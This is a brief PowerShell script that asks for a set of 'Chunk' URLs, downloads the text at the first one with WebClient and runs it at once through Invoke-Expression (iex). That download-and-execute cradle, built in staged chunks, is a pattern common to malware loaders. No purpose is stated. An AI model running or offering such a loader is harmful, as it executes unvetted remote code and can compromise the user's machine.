$b1 -eq $null -and ($b1 = Read-Host "Chunkb1Url")
$c12 -eq $null -and ($c12 = Read-Host "Chunkc12Url")
$c13 -eq $null -and ($c13 = Read-Host "Chunkc13Url")    
$b2 -eq $null -and ($b2 = Read-Host "Chunkb2Url")
$b3 -eq $null -and ($b3 = Read-Host "Chunkb3Url")
$b4 -eq $null -and ($b4 = Read-Host "Chunkb4Url")
$b5 -eq $null -and ($b5 = Read-Host "Chunkb5Url")
$b6 -eq $null -and ($b6 = Read-Host "Chunkb6Url")    
$wbc = New-Object System.Net.WebClient
$wbc.Encoding = [System.Text.Encoding]::UTF8
$wbc.DownloadString($b1) | iex